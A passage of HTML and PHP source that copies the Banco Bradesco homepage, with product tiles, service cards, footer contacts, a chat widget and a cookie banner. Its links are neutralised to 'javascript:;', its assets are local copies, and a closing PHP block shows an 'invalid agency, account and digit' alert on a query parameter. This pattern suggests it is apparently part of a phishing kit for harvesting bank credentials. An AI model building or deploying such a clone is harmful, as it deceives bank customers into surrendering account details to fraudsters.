                                    <source srcset="images/emprestimo_hover.png" type="image/png">
                                    <img src="images/emprestimo_hover.png" alt="Ícone Empréstimo Losango" />
                                </picture>
                            </div>
                            <p class="bra-texto">Empréstimo <br />Losango</p>
                        </a>
                    </div>


                    <div class="item">
                        <a href="javascript:;" title="Acesse Cielo" onclick="trackBradesco('Home Principal','nao tem conta aqui','Soluções para o seu negócio');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/cielo.webp" type="image/webp">
                                    <source srcset="images/cielo.png" type="image/png">
                                    <img src="images/cielo.png" alt="Ícone Cielo" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/cielo_hover.webp" type="image/webp">
                                    <source srcset="images/cielo_hover.png" type="image/png">
                                    <img src="images/cielo_hover.png" alt="Ícone Cielo" />
                                </picture>
                            </div>
                            <p class="bra-texto">Soluções para <br>o seu negócio</p>
                        </a>
                    </div>


                    <div class="item item-veloe">
                            
                        <a href="javascript:;" title="Acesse Veloe" onclick="trackBradesco('Home Principal','nao tem conta aqui','Veloe');">
                            <div class="c-slider-products__backward">
                                <span class="title-veloe">24 mensalidades grátis</span>
                                <span class="lnk--white lnk--arrow">Contrate</span>
                            </div>
                            <div class="bra-icone">
                                <picture>
                                    <!-- <source srcset="images/veloe.webp" type="image/webp"> -->
                                    <source srcset="images/veloe.png" type="image/png">
                                    <img src="images/veloe.png" alt="Ícone Veloe" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/veloe_hover.webp" type="image/webp">
                                    <source srcset="images/veloe_hover.png" type="image/png">
                                    <img src="images/veloe_hover.png" alt="Ícone Cielo" />
                                </picture>
                            </div>
                            <p class="bra-texto texto-veloe">Veloe</p>
                            <!-- <p class="bra-texto texto-descritivo-veloe">18 x mensalidades grátis</p> -->
                        </a>
                    </div>


                    <div class="item">
                        <a href="javascript:;" title="Acesse Bitz" onclick="trackBradesco('Home Principal','nao tem conta aqui','Bitz');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/bitz.webp" type="image/webp">
                                    <source srcset="images/bitz.png" type="image/png">
                                    <img src="images/bitz.png" alt="Ícone Bitz" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/bitz_hover.webp" type="image/webp">
                                    <source srcset="images/bitz_hover.png" type="image/png">
                                    <img src="images/bitz_hover.png" alt="Ícone Bitz" />
                                </picture>
                            </div>
                            <p class="bra-texto">Bitz</p>
                        </a>
                    </div>


                    <div class="item">
                        <a href="javascript:;" title="Acesse Seguros" onclick="trackBradesco('Home Principal','nao tem conta aqui','Seguros');">
                            <div class="bra-icone">
                                <picture>
                                    <!-- <source srcset="images/plano-dental.webp" type="image/webp"> -->
                                    <source srcset="images/consorcio_seguros.png" type="image/png">
                                    <img src="images/consorcio_seguros.png" alt="Ícone Seguros" />
                                </picture>
                                <picture class="over" aria-hidden="true"> 
                                    <!-- <source srcset="images/plano-dental_hover.webp" type="image/webp"> --> 
                                    <source srcset="images/consorcio_seguros_hover.png" type="image/png">
                                    <img src="images/consorcio_seguros_hover.png" alt="Ícone Seguros" /> 
                                </picture>
                            </div>
                            <p class="bra-texto">Seguros</p> 
                        </a>
                    </div>



                </div>
            </div>
        </div>
    </section>
    <div class="clearfix"></div>
    <section id="box__home">
        <div class="container">
            <h2 class="title">Mais Facilidades</h2>
            <div class="cards__vantagens">
                <div class="card__item">
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','SAC/Ouvidoria');">
                        <div class="box__img">
                            <span class="box__filter"></span>
                            <img class="img-responsive" src="images/icon-sac-ouvidoria.svg" alt="SAC/Ouvidoria">
                            <img class="img-responsive over" src="images/icon-sac-ouvidoria-white.svg" alt="SAC/Ouvidoria">
                        </div>
                        <span class="box__home-title">SAC/Ouvidoria</span>
                    </a>
                </div>
                <div class="card__item">
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','Boletos');">
                        <div class="box__img">
                            <span class="box__filter"></span>
                            <img class="img-responsive" src="images/icone-boletos.svg" alt="Boletos">
                            <img class="img-responsive over" src="images/icone-boletos-white.svg" alt="Boletos">
                        </div>
                        <span class="box__home-title">Segunda via do boleto</span>
                    </a>
                </div>
                <div class="card__item">
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','Pagamentos');">
                        <div class="box__img">
                            <span class="box__filter"></span>
                            <img class="img-responsive" src="images/icone-pagamentos.svg" alt="Pagamentos">
                            <img class="img-responsive over" src="images/icone-pagamentos-white.svg" alt="Pagamentos">
                        </div>
                        <span class="box__home-title">Pagamentos</span>
                    </a>
                </div>
                <div class="card__item">
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','Renegociação de Dívidas');">
                        <div class="box__img">
                            <span class="box__filter"></span>
                            <img class="img-responsive" src="images/icone-renegociacao-de-dividas.svg" alt="Renegociação de Dívidas">
                            <img class="img-responsive over" src="images/icone-renegociacao-de-dividas-white.svg" alt="Renegociação de Dívidas">
                        </div>
                        <span class="box__home-title">Renegociação de Dívidas</span>
                    </a>
                </div>
                <div class="card__item hidden-sm hidden-xs">
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','Veja mais Facilidades');">
                        <div class="box__img">
                            <span class="box__filter"></span>
                            <img class="img-responsive" src="images/icone-mais-facilidades.svg" alt="Mais facilidades">
                            <img class="img-responsive over" src="images/icone-mais-facilidades-white.svg" alt="Mais facilidades">
                        </div>
                        <span class="box__home-title">Veja mais Facilidades</span>
                    </a>
                </div>
                    <a href="javascript:;" onclick="trackBradesco('Home Classic','servicos on-line','Veja mais Facilidades mobile');" class="btn_classic-solid visible-sm visible-xs">Veja mais</a>
                
            </div>
        </div>
    </section>
    <section id="box__destaques">
        <h2 class="box__home-title">REINVENTE O FUTURO</h2>
        <p style="text-align: center;">Opções para te ajudar em todos os momentos</p>
        <div class="box__destaques-bg">
            <div class="container mobile">
                <div class="row">
                    <div class="col-lg-4 col-sm-6 col-xs-6">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','bia whatsapp');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>FALE COM A BIA</span>
                                    <p>Ela te ajuda até pelo WhatsApp​</p>
                                </div>
                                <img class="img_destaque_4" src="images/destaque-1.jpg" alt="#PraCegoVer Texto: BIA. Ela te ajuda até pelo WhatsApp.">
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-6">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','convergência digital');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>CHAVE DE SEGURANÇA NO CELULAR E SENHA DE 4 DÍGITOS</span>
                                    <p>Veja como é fácil cadastrar ;)</p>
                                </div>
                                <img class="img_destaque_2 img_destaque_desktop" src="images/destaque-3.jpg" alt="#PraCegoVer Texto: Chave de segurança no celular e senha de 4 dígitos. Veja como é fácil cadastrar ;)">
                                <img class="img_destaque_2 img_destaque_mobile" src="images/m-destaque-3.jpg" alt="#PraCegoVer Texto: Chave de segurança no celular e senha de 4 dígitos. Veja como é fácil cadastrar ;)">
                            </div>
                        </a>
                    </div>
                    <div  class="col-lg-4 col-sm-6 col-xs-6">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','open banking');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>open banking</span>
                                    <p>O que é e como funciona</p>
                                </div>
                                <img class="img_destaque_4" src="images/open-banking-bradesco.png" alt="#PraCegoVer Texto: Open banking - O que é e como funciona">
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-6">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','horário agencias');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>PROCURANDO O TELEFONE OU ENDEREÇO DA AGÊNCIA?</span>
                                    <p>Consulte aqui</p>
                                </div>
                                <img class="img_destaque_5" src="images/destaque-2.jpg" alt="#PraCegoVer Texto: PROCURANDO O TELEFONE OU ENDEREÇO DA AGÊNCIA? Consulte aqui.">
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-6">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','prorrogação dividas');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>SAIBA COMO PRORROGAR DÍVIDAS​</span>
                                    <p>Confira os horários das nossas centrais de atendimento e mais</p>
                                </div>
                                <img class="img_destaque_3 img_destaque_desktop" src="images/destaque-4.jpg" alt="#PraCegoVer Texto: SAIBA COMO PRORROGAR DÍVIDAS​ - Confira os horários das nossas centrais de atendimento e mais">
                                <img class="img_destaque_3 img_destaque_mobile" src="images/m-destaque-4.jpg" alt="#PraCegoVer Texto: SAIBA COMO PRORROGAR DÍVIDAS​ - Confira os horários das nossas centrais de atendimento e mais">
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-6 ">
                        <a href="javascript:;" onclick="trackBradesco('Home Classic','vitrine','internet banking');">
                            <div class="box__hover">
                                <div class="box_color_bg"></div>
                                <div class="box__black"></div>
                                <div class="box__hover-text">
                                    <span>INTERNET BANKING</span>
                                    <p>Sua vida financeira on-line​</p>
                                </div>
                                <img class="img_destaque_5" src="images/destaque-6.jpg" alt="#PraCegoVer Texto: INTERNET BANKING - Sua vida financeira on-line​.">
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </section>

    
    <!-- Fechamento da tag wrapper aberta no header -->
</div>
<!-- Footer Padrão -->
<footer class="c-footer" id="footer">
	<div class="c-uteis">
		<div class="c-ctnr">
			<nav>
				<ul>
					<li class="c-uteis__lnk js-collapse">
						<a href="#"
							onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Informações Uteis','{Title}');">Informações
							úteis</a>
					</li>
					<li class="c-uteis__content js-content">
						<ul class="c-info">
							<li>
								<a href="javascript:;"><span>Cestas
										de Serviços e Tarifas</span></a>
							</li>
							<li>
								<a href="javascript:;"
									target="_blank" rel="noopener"><span>Portal do Consumidor - PROCONs </span></a>
							</li>
							<li>
								<a href="javascript:;"
									rel="noopener"><span>Consumidor.gov.br</span></a>
							</li>
						</ul>

						<ul class="c-info">
							<li>
								<a href="javascript:;"
									rel="noopener"><span>Consumidor.gov.br</span></a>

								</a>
							</li>
							<li>
								<a href="javascript:;"
									title="Sistema de Informações de Créditos-SCR" data-width="540" data-height="480"
									class="modalFree sistema" tabindex="59"
									onclick="trackBradesco('Classic','Rodape','Sistema de Infomacao de Credito');">
									<span>Sistema de Informação ao Crédito</span>
								</a>

							</li>
							<li>
								<a href="javascript:;"
									rel="noopener"><span>Comparativos de Tarifas – FEBRABAN </span></a>

							</li>
						</ul>

						<ul class="c-info">
							<li>
								<a href="javascript:;"
									rel="noopener"><span>Taxa de Juros de Operações de Crédito - BACEN</span></a>

							</li>
							<li>
								<a href="javascript:;"
									rel="noopener"><span>Código de Defesa do Consumidor</span></a>

							</li>
							<li>
								<a href="javascript:;"
									target="_blank" rel="noopener"><span>Lei Geral de Proteção de Dados</span></a>

							</li>
						</ul>
					</li>
					<li class="c-uteis__lnk js-collapse fone-title">
						<a href="#" onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Informações Uteis','Fone Facil, sac e ouvidoria');">Fone Fácil, Sac e Ouvidoria</a>
					</li>
					<li class="c-uteis__content js-content fone-content">
						<ul class="c-facil" data-toggle="tooltip" data-original-title="Pelo <strong>atendimento eletrônico</strong>, disponível 24 horas, você faz pagamentos, transferências e consultas de saldo e extratos.<br><br>E pelo <strong>atendimento personalizado</strong>, além de transações, você faz consultas e tira dúvidas sobre sua conta. Confira o horário de atendimento:<br><br><li>Segunda a sexta-feira, das 7h às 22h </li><li>Sábado, das 9h às 15h </li><li>Domingo e feriado nacional, sem expediente </li>">
							<li>
								Fone Fácil
							</li>
							<li>
								<strong>4002 0022</strong>
							</li>
							<li>
								Capitais/ Regiões metropolitanas
							</li>
						</ul>

						<ul class="c-facil">
							<li>
								<strong>0800 570 0022</strong>
							</li>
							<li>
								Demais Regiões
							</li>
						</ul>

						<ul class="c-facil">
							<li>
								<strong>55 11 4002 0022</strong>
							</li>
							<li>
								Acesso do Exterior
							</li>
						</ul>

						<ul class="c-facil">
							<li>
								<strong>0800 722 0099</strong>
							</li>
							<li>
								Deficiência Auditiva/Fala
							</li>
						</ul>

						<ul class="c-facil" data-toggle="tooltip" title="Solicite o <strong>cancelamento</strong> de produtos e serviços ou registre <strong>reclamações</strong> e <strong>sugestões</strong>. O atendimento é 24 horas.">
							<li>
						
								SAC Alô Bradesco
						
							</li>
						
							<li>
								<strong>0800 704 8383</strong>
							</li>
							<li>
								<a href="javascript:;">Demais SACs
								</a>
							</li>
						</ul>

						<ul class="c-facil" data-toggle="tooltip" title="Se sua reclamação já foi tratada pelo SAC Alô Bradesco, mas você não concorda com a resposta recebida, pode contestar na Ouvidoria. 
						O atendimento é das 9h às 18h, de segunda a sexta-feira, exceto feriados."> 
							<li>
								Ouvidoria
							</li>
							<li>
								<strong>0800 727 9933</strong>
							</li>
							<li>
								<a
									href="https://banco.bradesco/html/classic/atendimento/fale-conosco/ouvidoria/index.shtm?pq/id"><span>Fale
										com a Ouvidoria</span></a>
							</li>
						</ul>

					</li>
					<li class="c-uteis__lnk js-collapse">
						<a href="#"
							onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Informações Uteis','Bia');">Bia</a>
					</li>
					<li class="c-uteis__content js-content">
						<ul class="c-bia">
							<li>
								<picture>
									<img src="images/qr-code-whatsapp-bia.png" alt="QR CODE">
								</picture>
							</li>
							<li>
								<span>Fale com a BIA pelo WhatsApp:</span>
								<a href="javascript:;" rel="noopener"><span><strong>11
											3335 0237</strong></span></a>
							</li>
						</ul>

						<ul class="c-bia">
							<li>
								<picture>
									<img src="images/icon-app-bia.png" alt="Bia">
								</picture>
							</li>
							<li>
								<span id="pergunteBIA">Pelo aplicativo, você consegue tirar dúvidas <br> por voz ou
									texto na opção "Pergunte pra BIA" </span>
							</li>
						</ul>

						<ul class="c-bia">
							<li>
								<picture>
									<img src="images/icon-googleassistente.png" alt="Google Assistente">
								</picture>
							</li>
							<li>
								<span id="GoogleAssistente">Baixe o Google Assistente no seu celular. <br>Fale "OK,
									Google, falar com a BIA do bradesco"</span>
							</li>
						</ul>
					</li>
					<li class="c-uteis__lnk js-collapse">
						<a href="#">sites bradesco</a>
					</li>
					<li class="c-uteis__content js-content">
						<nav class="c-map js-acc-map">

						</nav>
					</li>
				</ul>
			</nav>
		</div>
	</div>
	<div class="c-gradiente">
		<div class="c-ctnr">
			<div class="c-seguir">
				<nav>
					<ul>
						<li>
							<span>
								acompanhe:
							</span>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Linkedin');">
								<picture>
									<img src="images/linkedin-01.svg" alt="linkedin">
								</picture>
							</a>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Facebook');">
								<picture>
									<img src="images/facebook-01.svg" alt="facebook">
								</picture>
							</a>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Twiter');">
								<picture>
									<img src="images/twitter-01.svg" alt="twitter">
								</picture>
							</a>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Youtube');">
								<picture>
									<img src="images/youtube-01.svg" alt="youtube">
								</picture>
							</a>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Instagran');">
								<picture>
									<img src="images/instagram-01.svg" alt="instagram">
								</picture>
							</a>
						</li>
						<li>
							<a target="blank" href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Menu Inferior - Acompanhe','Tik Tok');">
								<picture>
									<img src="images/tiktok-01.svg" alt="tik tok">
								</picture>
							</a>
						</li>
					</ul>
				</nav>
			</div>
			<div class="c-endereco">
				<address>
					Banco Bradesco SA | CNPJ: 60.746.948.0001-12 <br> Cidade de Deus, s/nº Vila Yara | Osasco | SP |
					CEP:
					06029-900
				</address>
			</div>
			<div class="c-brand">
				<picture>
					<img src="images/logo-mobile.svg" alt="">
				</picture>
			</div>
			<div class="c-rapido">
				<nav>
					<ul>
						<li>
							<a href="javascript:;" target="__blank"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Sobre o Bradesco');">sobre o
								bradesco <span>|</span></a>
						</li>
						<li>
							<a class="js-popup" href="#"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Portabilidade');">portabilidade
								<span>|</span></a>
							<div class="c-popup js-popup-content">
								<ul>
									<li>
										<a href="javascript:;"
											onclick="trackBradesco('Portal Classic - Home','Rodapé','Portabilidade - Credito');">Crédito</a>
									</li>
									<li>
										<a href="javascript:;"
											onclick="trackBradesco('Portal Classic - Home','Rodapé','Portabilidade - Salario');">Salário</a>
									</li>
								</ul>
							</div>
						</li>
						<li>
							<a href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Bradesco Imprensa');">bradesco
								imprensa <span>|</span></a>
						</li>
						<li>
							<a href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Trabalhe Conosco');">Trabalhe
								Conosco <span>|</span></a>
						</li>
						<li>
							<a href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Segurança');">Segurança
								<span>|</span></a>
						</li>
						<li>
							<a href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Crédito responsável');">CRÉDITO
								RESPONSÁVEL <span>|</span></a>
						</li>
						<li>
							<a href="javascript:;"
								onclick="trackBradesco('Portal Classic - Home','Rodapé ','Relação com Investidores');">relação
								com investidores</a>
						</li>
					</ul>
				</nav>
			</div>
		</div>
	</div>
</footer>
<!-- End: Footer -->

<!-- Chat Bia --> 
<div id="chatbia">
    <div id="chatbia-button">
        <a href="javascript:;" title="Ativar Fale com a Bia" role="button"> 
            <img src="images/btn-new-bia.png" alt="Icone do Fale com a Bia"></span>
        </a>
    </div>
    <div id="chatbia-balloon">
        <div class="balloon">
            <a href="#fechar" id="chatbia-fechar" tabindex="-1" aria-hidden="true"></a>
            <p>A BIA é a Inteligência Artificial do Bradesco, e está preparada para tirar suas dúvidas sobre produtos, serviços e muito mais! <br> Chama ela e aproveita ;)</p>
        </div>
    </div>
</div>

<script type="text/javascript" src="js/chatbia-dist.js" defer></script>
 
<!-- End: Chat Bia --> 

    <script src="js/validaFrame.js"></script>
<!-- <script src="js/valida_agenciaconta.js"></script> -->
<script src="js/lembrarAgCta.js"></script>
<script src="js/bAutocomplete.js"></script>
<script src="js/bPagina-min.js"></script>
<script src="js/jquery-3.4.1.min.js"></script>
<script src="js/ua-parser.min.js"></script>
<script src="js/chosen.jquery.min.js"></script>
<script src="js/jquery.mmenu.min.js"></script>
<script src="js/jquery.magnific-popup.min.js"></script>
<script src="js/jquery.color.js"></script>
<script src="js/owl.carousel.min.js"></script>
<script src="js/bootstrap-select.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap-4.3.1.min.js"></script>
<script src="js/mediaelement-and-player.min.js"></script>
<script src="js/jquery.touchSwipe.min.js"></script>
<script src="js/jquery.placeholder.min.js"></script>
<script src="js/validaFormNaoCorrentista.js"></script>
<script src="js/mascara.js"></script>
<script src="js/retargeting.js"></script>
<script src="js/validanavegadorexclusivo.js"></script>
<script src="js/detect-mobile.js"></script>
<script src="js/moment.min.js"></script>
<script src="js/modal-cartoes.js"></script>
<script src="js/js.cookie-2.2.1.min.js"></script>
<script src="js/index-footer.js"></script>
<script src="js/index-footer-mapp.js"></script>
<script src="js/html5lightbox.js"></script>

<!-- ============================ inclusao LGPD ============================================ -->

<link rel="stylesheet" href="css/main-cookie.css">
<div id="cookies" class="cookies js-cookie">
    <div class="cookies__content">
        <div class="cookies__description">
            <p>Usamos cookies pra oferecer a melhor experiência e analisar o uso de nosso site, direcionar conteúdos e anúncios personalizados e facilitar a navegação de forma segura. Para mais informações, consulte nossa <a href="https://www.bradescoseguranca.com.br/html/seguranca_corporativa/pf/seguranca-informacao/privacidade.shtm
                "
                    title="A proteção à privacidade e aos dados dos usuários refletem os valores da Organização Bradesco e reafirmam o seu compromisso com a melhoria contínua da eficácia do processo de proteção de dados" class="js-href"><strong>Diretiva
                        de Privacidade</strong></a>.
            </p>
        </div>
        <div class="cookies__cta">
            <a role="button" title="Fechar" class="c-btn js-aceitar">Fechar</a>
            <!-- liberar 2ª fase MVP2 remover class is-hidden -->
            <a role="button" title="Configurar cookies" class="c-btn js-configurar is-hidden">Configurar Cookies</a>
            <span class="cookies__closed js-fechar hidden" title="Fechar">x</span>
        </div>
    </div>
</div>
<div id="js-modal" class="c-overlay">
    <div class="c-modal c-modal--radius c-modal--shadow">
        <header class="c-modal__header brd-b mb-30">
            <button class="c-closed" title="Fechar">X</button>
            <h2 class="c-modal__title">Cookies</h2>
            <div class="c-logo">
                <!-- <img src="" alt="Banco Bradesco"> -->
            </div>
        </header>
        <div class="c-modal__content">
            <ul class="c-ul--none">
                <li>
                    <input type="checkbox" id="js-ct" class="c-chkbox">
                    <label for="ct" class="c-label">Cookies técnicos e estritamente necessários</label>
                </li>
                <li class="pl-45 pb-30 brd-b">
                    São cookies necessários para que o site funcione adequadamente ou para fornecer o serviço
                    solicitado pelo usuário. Desta forma, são cookies de personalização que permitem que o usuário
                    se lembre de informações, como algumas características que podem diferenciar sua experiência da
                    experiência de outros usuários, como o idioma ou o número de resultados a ser mostrado numa
                    busca São considerados necessários e, portanto, não estão sujeitos a consentimento.
                </li>
                <li>
                    <input type="checkbox" id="js-ca" class="c-chkbox">
                    <label for="ca" class="c-label">Cookies Analíticos</label>
                </li>
                <li class="pl-45 pb-30 brd-b">
                    Esse tipo de cookies nos permite reconhecer e contabilizar o número de visitantes em nosso site
                    e analisar como ele é navegado e utilizado Eles permitem a execução de perfis de navegação, mas
                    não coletam informações pessoais Isso inclui Google Analytics um serviço de análise da web
                    fornecido pelo Google, Inc Para mais informações sobre como o Google coleta e processa essas
                    informações, acesse: <a href="" class="c-link--blue">policies google</a>
                </li>
                <li>
                    Você pode consultar nossa política de cookies a qualquer momento <a href=""
                        class="c-link--blue">aqui</a> ou no site.
                </li>
                <li class="aln-right">
                    <a href="" class="c-btn js-salvar">Aceitar e Salvar</a>
                </li>
            </ul>
        </div>
    </div>
</div>
<!-- / modal -->
<script src="js/js-cookie.min.js"></script>
<script src="js/index-cookie.js"></script>
    <script src="js/main.js"></script>
    <script src="js/index.js"></script>
    <!-- CHat -->
    <div class="posso_ajudar">
        <a href="#" onClick="Chat=window.open('https://chats.bradesco/netcallcenter/chat5_internet/Cliente/frm_login.aspx?IdArea=3&Idioma=0&sel=HomePage','Chat','width=465,height=590')">

            <div class="header_chat">
                <div class="titulo">
                    <img class="img-responsive img-balon" src="images/icon-chat-balon.png" alt="Chat Balon">
                    <span>Atendimento exclusivo</span>
                </div>
                <span class="spacer-rule"></span>
                <div class="titulo-footer">
                    <span>CLIENTE DIGITAL</span>
                </div>
            </div>
        </a>
    </div>
    <!--END  CHat -->

    <!-- Chamada dos JS do Banner -->
    <script defer src="js/jquery.flexslider.js"></script>
    <script src="js/banner.js"></script>
    <script src="js/jquery.easing.js"></script>
    <script src="js/jQuery-plugin-progressbar.js"></script>
    <script src="js/jquery.mousewheel.js"></script>
    <script src="js/index-progress-bar.js"></script>

    <!-- Chamada para carregamento do chat -->
    <script src="js/chat.js"></script>

    <!-- Slick -->
    <script src="js/slick.min.js"></script>
    <script src="js/home.js"></script>
    <?php
        if(isset($_GET['msg'])){
                echo "<script>alert('Informações inválidas. Por favor, verifique agência, conta e dígito.');</script>";
        }
    ?>
</body>
</html>